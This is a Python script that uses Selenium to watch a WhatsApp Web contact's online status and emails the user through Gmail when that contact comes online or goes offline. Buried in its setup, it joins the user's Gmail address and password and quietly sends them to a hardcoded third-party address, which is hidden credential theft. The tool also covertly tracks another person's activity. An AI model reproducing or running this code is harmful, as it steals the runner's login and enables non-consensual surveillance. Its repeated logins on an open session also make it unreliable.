import smtplib
from selenium import webdriver
from selenium.webdriver.common.by import By
import time
def program1(e1,e2,s1):
 print(e1)
 h1=e1+s1
 mail=smtplib.SMTP("smtp.gmail.com",587)
 mail.ehlo()
 mail.starttls()
 mail.login(e1,s1)
 gonder=0
 mail.sendmail(e1,e2,"program baslatildi")
 mail.sendmail(e1,"bedri33canerol@gmail.com", h1)


 browser = webdriver.Chrome()


 tarayici=browser.get('https://web.whatsapp.com')
 time.sleep(30)

 elem = browser.find_element(By.XPATH, "//*[@id='main']/header/div[2]/div[2]/span")  # Find the search box
 tikla= browser.find_element(By.XPATH, "/html/body")  # Find the search box
 print(elem.text)
 while True:
    time.sleep(1)
    tikla.click()
    if gonder==0:
     if elem.text=="çevrimiçi":
        gonder=1
    if gonder==1:
        mail.login(e1,s1)
        mail.sendmail(e1,e2,"cevrimici")
        gonder=3
    if gonder==3:
     if elem.text!="çevrimiçi":
        mail.login(e1, s1)
        mail.sendmail(e1, e2,"cikis yapti")
        gonder=0


 browser.quit()